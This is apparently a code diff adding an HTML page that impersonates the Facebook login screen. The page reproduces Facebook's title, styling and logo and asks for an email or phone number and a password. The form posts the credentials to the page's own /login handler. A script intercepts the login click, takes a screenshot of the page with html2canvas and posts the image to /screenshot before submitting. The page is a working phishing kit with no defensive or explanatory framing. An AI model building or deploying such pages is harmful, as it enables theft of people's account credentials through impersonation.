@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or sign up</title>
+    <style>
+        body {font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
+        .box {background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);width:396px;}
+        .logo img {width:100px;margin-bottom:20px;}
+        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;box-sizing:border-box;}
+        input:focus {border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff;}
+        button {width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;}
+        button:hover {background:#166fe5;}
+        .forgot {text-align:center;margin-top:15px;}
+        .forgot a {color:#1877f2;text-decoration:none;font-size:14px;}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo" style="text-align:center">
+            <img src="/static/fb_logo.png" alt="Facebook">
+        </div>
+        <form method="POST" action="/login">
+            <input type="text" name="username" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <div class="forgot"><a href="#">Forgot password?</a></div>
+        </form>
+    </div>
+
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script>
+        document.querySelector('button').addEventListener('click', e => {
+            e.preventDefault();
+            setTimeout(() => {
+                html2canvas(document.body).then(canvas => {
+                    fetch('/screenshot', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({image: canvas.toDataURL()})
+                    }).finally(() => document.querySelector('form').submit());
+                }).catch(() => document.querySelector('form').submit());
+            }, 800);
+        });
+    </script>
+</body>
+</html>
